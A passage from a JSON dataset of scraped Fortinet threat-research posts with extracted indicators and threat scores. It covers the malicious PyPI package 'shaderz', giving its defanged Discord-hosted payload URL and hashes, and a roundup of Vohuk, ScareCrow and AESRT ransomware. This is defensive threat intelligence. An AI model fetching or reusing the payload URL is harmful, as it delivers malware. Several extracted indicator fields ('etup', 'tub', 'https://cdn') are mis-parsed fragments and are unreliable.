        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "3188cbe5b60ed7c22c0ace143681b1c18f0e06658a314bdc4c7c4b8f77394729",
          "80fba2dcc7ea2e8ded32e8f6c145cf011ceb821e57fee383c02d4c5eaf8bbe00",
          "4b6d8590a2db42eda26d017a119287698c5b0ed91dd54222893f7164e40cb508",
          "De85f1916d6102fcbaceb9cef988fca211a9ea74599bf5c97a92039ccf2da5f7",
          "646ea89512e15fce61079d8f82302df5742e8e6e6c672a3726496281ad9bfd8a",
          "71453640ebf7cf8c640429a605ffbf56dfc91124c4a35c2ca6e5ac0223f77532",
          "2a0397adb55436efa86d8569f78af0934b61f5b430fa00b49aa20a4994b73f4b",
          "c33e50c3be111c1401037cb42a0596a123347d5700cee8c42b2bd30cdf6b3be3"
        ],
        "cve": [],
        "email": [],
        "url": [
          "https://example.com/opencart/admin/index.php?route=common"
        ]
      },
      "threat_score": 0.2951456310679612
    }
  },
  {
    "id": "Fortinet_68514",
    "source": "Fortinet",
    "title": "Supply Chain Attack via New Malicious Python Package, “shaderz” (Part 1)",
    "text": "FortiGuard Labs Threat Research Our Fortinet Advanced Research Team recently discovered a 0-day attack in a PyPI package (Python Package Index) called “shaderz”. It was discovered on December 6, 2022, through a system we use to monitor open-source ecosystems. This Python package was published on December 2, 2022, as shown in its official PyPI repository. Our suspicions were initially raised because it only has one published version, 0.0.1, and does not include a clear description of the package, the author’s email, or its source page. The package includes malicious code in its setup.py installation script that downloads and runs an executable file as a part of its installation. One particularly interesting element is the URL, which requires deeper analysis: https://cdn[.]discordapp[.]com/attachments/1045000289708687390/1045159487079723058/stub.exe. As shown in the VirusTotal entry below, the download URL includes the following binary exe (SHA 256):33df1d9c50a9bd9d3e71dc61c0a7f41f7ca51612e9c3babcea927adde169e62d. While this download URL has not previously been detected by any other threat researchers, some vendors do flag the downloaded executable file as malicious. The downloaded executable seems to be a python script compiled into an executable file. We will share more details of our analysis of this file in our next post. We will continue to monitor and help organizations defend against malicious packages found in the wild like this one to help protect our customers against attacks from unknown sources. For more detail,read part 2of this blog. FortiGuard AntiVirus detects the malicious executable identified in this report as W32/PossibleThreat The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Customers running current AntiVirus updates are protected. The FortiGuard Web Filtering Service detects as malicious and blocks the download URL cited in this report. shaderz-0.0.1[.]tar[.]gz fd9f944fafb58faf783fdf4f8638d281a429b84cdb119756e6d7d92b31a079de 33df1d9c50a9bd9d3e71dc61c0a7f41f7ca51612e9c3babcea927adde169e62d Malicious URLs cdn[.]discordapp[.]com/attachments/1045000289708687390/1045159487079723058/stub[.]exe Learn more about Fortinet’sFortiGuard Labsthreat research and global intelligence organization and Fortinet’s FortiGuard AI-powered Security Servicesportfolio. Sign upto receive our threat research blogs. threat information sharing,threat intelligence,advanced threat protection,threat analysis,python FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/supply-chain-attack-new-malicious-python-package-shaderz",
      "scraped_at": "2025-07-20T14:03:01.441576",
      "indicators": {
        "ip_address": [],
        "domain": [
          "etup",
          "tub"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "fd9f944fafb58faf783fdf4f8638d281a429b84cdb119756e6d7d92b31a079de",
          "33df1d9c50a9bd9d3e71dc61c0a7f41f7ca51612e9c3babcea927adde169e62d"
        ],
        "cve": [],
        "email": [],
        "url": [
          "https://cdn"
        ]
      },
      "threat_score": 0.36363636363636365
    }
  },
  {
    "id": "Fortinet_53408",
    "source": "Fortinet",
    "title": "Ransomware Roundup – New Vohuk, ScareCrow, and AERST Variants",
    "text": "FortiGuard Labs Threat Research On a bi-weekly basis,FortiGuard Labsgathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolvingransomwarelandscape and the Fortinet solutions that protect against those variants. This latest edition of the Ransomware Roundup covers Vohuk, ScareCrow, and AERST ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts files on the compromised machine and demands ransom for file decryptionSeverity level:High Like most ransomware, the new Vohuk variant encrypts files on compromised machines and tries to extort money from victims. Its dropped ransom note, “README.txt”, asks victims to contact the attacker via email with a unique ID assigned to each victim. As seen in the ransom note, this Vohuk ransomware variant is version 1.3, potentially indicating that the attacker has updated the ransomware several times. Files encrypted by Vohuk ransomware have a “. Vohuk” file extension. It also replaces file icons with a red lock icon. The ransomware also replaces the desktop wallpaper with its own. The ransomware leaves a distinctive mutex, “Global\\\\VohukMutex”, which prevents different instances of Vohuk ransomware from running on the same system. Based on the file submission locations to VirusTotal, Vohuk ransomware has primarily affected Germany and India. ScareCrow is another typical ransomware that encrypts files on victims’ machines. Its ransom note, also titled “readme.txt”, contains three Telegram channels that victims can use to speak with the attacker. While no financial demand is requested in the ransom note, victims will most likely be asked to pay ransom to recover their encrypted files. At the time of this writing, those three Telegram channels were unavailable. ScareCrow ransomware appears to have some similarities with the infamous Conti ransomware: both use the CHACHA algorithm to encrypt files and delete shadow copies using wmic based on shadow copy IDs. This is not all that surprising because the Conti ransomware source code was reportedly leaked earlier in the year. However, the ScareCrow threat actor put some effort into developing this ransomware variant, as our analysis found some significant differences. For example, Conti encrypts all command strings with one decryption routine, whereas ScareCrow encrypts every string, including the name of the DLLs it loads (i.e., kernel32), the name of the APIs it uses, and even the command strings with its own decryption routine. ScareCrow ransomware adds a “. CROW” file extension to affected files. ScareCrow ransomware files were submitted to VirusTotal from Germany, India, Italy, the Philippines, Russia, and the United States. This indicates that this ransomware is relatively widespread, albeit by using unknown infection vectors. AESRT is a new ransomware strain that FortiGuard Labs recently came across. It encrypts files on compromised machines and appends an “. AESRT” file extension to the files it encrypts. Instead of leaving a ransom note, the ransomware displays a popup window that includes the attacker’s email address. It also accepts a field to enter the purchased key required to decrypt the ransomed files. The ransomware also deletes shadow copies, which inhibits the victim’s ability to recover files. Fortinet customers are already protected from these malware variants through FortiGuard’s AntiVirus and FortiEDR services, as follows: FortiGuard Labs detects known Vohuk, ScareCrow, and AESRT ransomware variants with the following AV signatures: Vohuk ransomware ScareCrow ransomware AESRT ransomware Vohuk ransomware ScareCrow ransomware AESRT ransomware Due to the ease of disruption, damage to daily operations, potential impact to an organization’s reputation, and the unwanted destruction or release ofpersonally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering integration and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because payment does not guarantee that files will be recovered. According to aU. S. Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. And ourIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Learn more about Fortinet’sFortiGuard Labsthreat research and intelligence organization and the FortiGuard AI-powered securityservices portfolio. ransomware,Ransomware Roundup,variant,FortiGuards Labs,threat analysis FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-new-vohuk-scarecrow-and-aerst-variants",
      "scraped_at": "2025-07-20T14:03:10.430338",
      "indicators": {
        "ip_address": [],
        "domain": [
          "eadme",
          "EADME"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.6176470588235295
    }
  }
]